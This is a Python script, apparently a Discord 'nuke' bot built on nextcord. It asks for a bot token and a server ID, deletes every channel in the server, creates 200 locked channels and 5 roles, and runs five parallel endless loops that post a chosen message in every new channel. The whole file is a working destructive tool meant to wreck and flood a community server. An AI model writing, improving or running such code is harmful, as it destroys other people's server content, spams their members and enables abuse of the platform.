import nextcord
import asyncio
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)  # Initialize colorama for automatic reset

CYAN = Fore.CYAN
WHITE = Fore.WHITE
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED

intents = nextcord.Intents.default()
client = nextcord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

    # Asking for user input with colored text
    guild_id = int(input(CYAN + "Guild ID: " + WHITE))
    guild = client.get_guild(guild_id)

    name = input(CYAN + "Name for channels and roles: " + WHITE)
    message = input(CYAN + "Message to send in every channel: " + WHITE)

    if not guild:
        print(RED + "Failed to find guild.")
        return

    # Clearing console
    print("\033c")

    # Bulk delete channels
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)
    print(GREEN + "Deleted all channels!")

    # Bulk create channels
    created_channels = []
    create_tasks = []

    for _ in range(200):
        overwrites = {
            guild.default_role: nextcord.PermissionOverwrite(send_messages=False)
        }
        create_tasks.append(guild.create_text_channel(name, overwrites=overwrites))

    created_channels = await asyncio.gather(*create_tasks)
    print(GREEN + "Created 200 channels!")

    # Function to continuously send messages in all channels
    async def spam_messages():
        while True:
            message_tasks = [channel.send(message) for channel in created_channels]
            await asyncio.gather(*message_tasks)
            print(YELLOW + "Sent message in all channels simultaneously!")
            await asyncio.sleep(1)  # 1-second delay before repeating

    # Distributing load across multiple tasks to improve speed
    for _ in range(5):  # Adjust the number of parallel tasks
        client.loop.create_task(spam_messages())

    # Bulk create roles
    role_tasks = [guild.create_role(name=name) for _ in range(5)]
    await asyncio.gather(*role_tasks)
    print(GREEN + "Created 5 roles!")

client.run(input(CYAN + "Bot Token: " + WHITE))
